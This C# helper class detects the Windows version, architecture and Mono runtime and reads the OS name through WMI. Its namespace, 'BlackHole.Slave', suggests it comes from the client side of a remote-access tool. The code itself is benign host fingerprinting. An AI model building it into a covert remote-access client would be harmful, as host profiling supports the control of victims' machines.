using System;
using System.Management;
using System.Text.RegularExpressions;

namespace BlackHole.Slave.Helper
{
    class PlatformHelper
    {
        static PlatformHelper()
        {
            Win32NT = Environment.OSVersion.Platform == PlatformID.Win32NT;
            XpOrHigher = Win32NT && Environment.OSVersion.Version.Major >= 5;
            VistaOrHigher = Win32NT && Environment.OSVersion.Version.Major >= 6;
            SevenOrHigher = Win32NT && (Environment.OSVersion.Version >= new Version(6, 1));
            EightOrHigher = Win32NT && (Environment.OSVersion.Version >= new Version(6, 2, 9200));
            EightPointOneOrHigher = Win32NT && (Environment.OSVersion.Version >= new Version(6, 3));
            TenOrHigher = Win32NT && (Environment.OSVersion.Version >= new Version(10, 0));
            RunningOnMono = Type.GetType("Mono.Runtime") != null;

            Name = "Unknown OS";
            using (var searcher = new ManagementObjectSearcher("SELECT Caption FROM Win32_OperatingSystem"))
            {
                foreach (var os in searcher.Get())
                {
                    Name = os["Caption"].ToString();
                    break;
                }
            }

            // Remove everything before first match "Windows" and trim end & start
            Name = Regex.Replace(Name, "^.*(?=Windows)", "").TrimEnd().TrimStart(); 
            Is64Bit = Environment.Is64BitOperatingSystem;
            FullName = $"{Name} {(Is64Bit ? 64 : 32)} Bit";
        }
        
        public static string FullName { get; }
        public static string Name { get; }
        public static bool Is64Bit { get; }
        public static bool RunningOnMono { get; }
        public static bool Win32NT { get; }
        public static bool XpOrHigher { get; }
        public static bool VistaOrHigher { get; }
        public static bool SevenOrHigher { get; }
        public static bool EightOrHigher { get; }        
        public static bool EightPointOneOrHigher { get; }        
        public static bool TenOrHigher { get; }
    }
}
